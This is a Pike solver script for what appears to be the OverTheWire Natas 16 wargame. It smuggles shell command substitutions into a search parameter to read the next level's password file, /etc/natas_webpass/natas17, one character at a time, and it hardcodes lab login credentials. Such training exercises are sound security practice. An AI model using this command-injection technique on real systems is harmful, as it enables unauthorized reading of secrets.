#!/usr/bin/pike

// So far all the passwords have been 32 characters long.
constant length = 32;
constant url = "http://natas16.natas.labs.overthewire.org/";
constant needle_template = "^$(cut -c %d /etc/natas_webpass/natas17)";
constant needle_template_n = "disallowing$(grep ^%s%d /etc/natas_webpass/natas17)";
constant needle_template_up_low = "disallowing$(grep ^%s%s /etc/natas_webpass/natas17)";

mapping headers = ([
    "Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==",
]);

int main()
{
    string pass = "";
    werror("Partial password: ");
    // Finding letters with no regard to the case.
    for (int i = 0; i < length; i++)
    {
        string needle = sprintf(needle_template, i + 1);
        string res = Protocols.HTTP.get_url_data(url, ([ "needle": needle ]),
                                                    headers);

        array(string) res_array = res / "\n";
        int pos = search(res_array, "<pre>");
        string current = lower_case(res_array[pos + 1]);
        if (current  == "</pre>")
        {
            // Oh, it's a digit, we don't which yet.
            pass += "$";
            werror("$");
        }
        else
        {
            pass += current[0..0];
            werror("%s", current[0..0]);
        }
    }
    werror("\nFinal password: ");

    for (int i = 0; i < sizeof(pass); i++)
    {
        // Unknown digit
        if (pass[i..i] == "$")
        {
            for (int j = 0; j < 10; j++)
            {
                string needle = sprintf(needle_template_n, "." * i, j);
                string res = Protocols.HTTP.get_url_data(url, ([ "needle": needle ]),
                                                            headers);

                if (search(res, "disallowing") < 0)
                {
                    werror("%d", j);
                    break;
                }
            }
        }
        else
        {
            array(string) up_lo = ({ pass[i..i], upper_case(pass[i..i]) });
            foreach (up_lo, string c)
            {
                string needle = sprintf(needle_template_up_low, "." * i, c);
                string res = Protocols.HTTP.get_url_data(url, ([ "needle": needle ]),
                                                            headers);

                if (search(res, "disallowing") < 0)
                {
                    werror("%s", c);
                    break;
                }
            }
        }
    }
    werror("\n");

    return 0;
}
